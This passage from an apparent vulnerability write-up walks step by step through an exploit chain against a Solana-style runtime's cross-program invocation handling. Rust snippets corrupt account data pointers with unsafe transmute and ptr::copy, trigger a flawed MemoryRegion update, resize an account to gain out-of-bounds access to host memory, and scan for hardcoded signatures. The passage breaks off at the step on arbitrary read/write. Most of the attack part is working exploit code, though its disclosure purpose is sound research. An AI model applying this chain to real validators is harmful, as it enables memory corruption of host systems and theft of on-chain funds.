<li><strong>SWAP</strong>: Small buffer account that serves as the target of the corrupted pointer. Its small buffer will be incorrectly mapped by SWAP&#x27;s large virtual space.</li>
<li><strong>POINTER</strong>: Pointer account whose <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion.host_addr</code> will be rewritten during memory scanning to point to arbitrary memory addresses. This account serves as our pointer pivot to achieve arbitrary read/write capability.</li>
<li><strong>LEVERAGE</strong>: Large buffer account whose <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion.host_addr</code> will be hijacked to point to SWAP&#x27;s smaller buffer, creating the size mismatch for out-of-bounds access.</li>
</ul>
<h4 class="text-2xl py-4 border-b border-white/10">Step 1: Account Preparation</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">First, we want to trigger copy-on-write on both <strong>LEVERAGE</strong> and <strong>SWAP</strong> accounts and also resize <strong>LEVERAGE</strong> to 1 byte to make the code path later simpler.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#999">// Trigger copy-on-write for dedicated buffers</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span> 
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span></span><span class="token token" style="color:#999">// Resize LEVERAGE to simplify exploit logic</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">realloc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span></code></div></pre>
<h4 class="text-2xl py-4 border-b border-white/10">Step 2: Fake Pointer Setup</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Then we want to overwrite SWAP&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo.data</code> pointer with <strong>LEVERAGE</strong>&#x27;s data pointer. This will cause the runtime to extract <strong>LEVERAGE</strong>&#x27;s data address when retrieving <strong>SWAP</strong>&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">vm_data_addr</code> during CPI.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#e2777a">ptr</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">copy</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>        </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>        </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>        </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">size_of</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<h4 class="text-2xl py-4 border-b border-white/10">Step 3: Vulnerability Trigger via CPI</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Now we trigger the flawed <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">update_caller_account()</code> logic by initiating a CPI call doing nothing but with the corrupted <strong>SWAP</strong> account.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#f08d49">invoke_signed</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new_with_bincode</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>        </span><span class="token token" style="color:#67cdcc">*</span><span>program_id</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>        </span><span class="token token" style="color:#7ec699">b&quot;&quot;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>        </span><span class="token token macro" style="color:#f8c555">vec!</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new</span><span class="token token" style="color:#ccc">(</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>key</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>    </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span></span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">During this CPI call, the runtime builds a <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">CallerAccount</code> for <strong>SWAP</strong> using the malformed <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">vm_data_addr</code>. Later when CPI returns, it starts the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> update process, but instead of finding <strong>SWAP</strong>&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>, it locates <strong>LEVERAGE</strong>&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> and updates <strong>LEVERAGE</strong>&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion.host_addr</code> to point to <strong>SWAP</strong>&#x27;s buffer.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 4: Size Mismatch to OOB</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Next, we expand <strong>LEVERAGE</strong> to create the size mismatch.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#999">// Resize LEVERAGE back to a larger size for memory scanning</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">realloc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">0xa00000</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">So when we access <strong>LEVERAGE</strong> beyond <strong>SWAP</strong>&#x27;s buffer size, we get out-of-bounds access to host memory.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 5: Egg Hunting for <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code></h4>
<p class="text-xl py-3 text-pretty sm:text-justify">With the out-of-bounds read/write, we can now hunt for the <strong>POINTER</strong> account&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> structure in host memory.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">let</span><span> leverage_data </span><span class="token token" style="color:#67cdcc">=</span><span> accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span></span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> scan_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> leverage_data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">add</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">0x2840</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>  </span><span class="token token" style="color:#999">// Start OOB scanning</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span></span><span class="token token" style="color:#cc99cd">loop</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> check_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> scan_ptr </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span>    
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#999">// Signature matching for MemoryRegion array</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>check_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x18</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x000000040020a238</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>       </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>check_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x58</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x0000000400202908</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>       </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>check_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x98</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x000000040020f308</span><span> </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>       </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>check_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0xd8</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0x0000000400000000</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span><span>        </span><span class="token token" style="color:#999">// Bingo!</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">We do a really simple signature matching here to locate the <strong>POINTER</strong> <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>. Since the VM memory layout is fixed, the pointer fields inside <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> for specific indices of input accounts are also fixed, so we can just hardcode these VM layout pointers as our signature.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 6: Arbitrary R/W via MemoryRegion Hijacking</h4>
